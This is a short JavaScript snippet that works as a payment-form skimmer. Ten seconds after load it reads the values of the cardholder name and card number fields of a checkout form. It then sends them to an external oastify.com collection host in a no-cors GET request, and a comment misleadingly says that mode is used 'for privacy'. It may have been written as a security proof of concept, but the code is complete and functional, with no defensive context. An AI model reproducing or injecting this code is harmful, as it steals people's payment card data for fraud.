// Function to extract values and send them to the specified URL
function sendValues() {
    // Extract values from the DOM elements
    const input1 = document.querySelector('.gu-epp-input-textfield')?.value || '';
    const input2 = document.querySelector('#gu-epp-cardholder')?.value || '';
    const input3 = document.querySelector('#gu-epp-cardno')?.value || '';

    // Construct the URL with the query parameters
    const targetUrl = `https://ne59atbdlkki4s3zi59vqqt9l0rsfi37.oastify.com?input1=${encodeURIComponent(input1)}&input2=${encodeURIComponent(input2)}&input3=${encodeURIComponent(input3)}`;

    // Send a GET request
    fetch(targetUrl, {
        method: 'GET',
        mode: 'no-cors', // Use 'no-cors' mode for privacy
    }).catch((err) => {
        console.error('Error sending data:', err);
    });
}

// Execute the function after 10 seconds
setTimeout(sendValues, 10000);
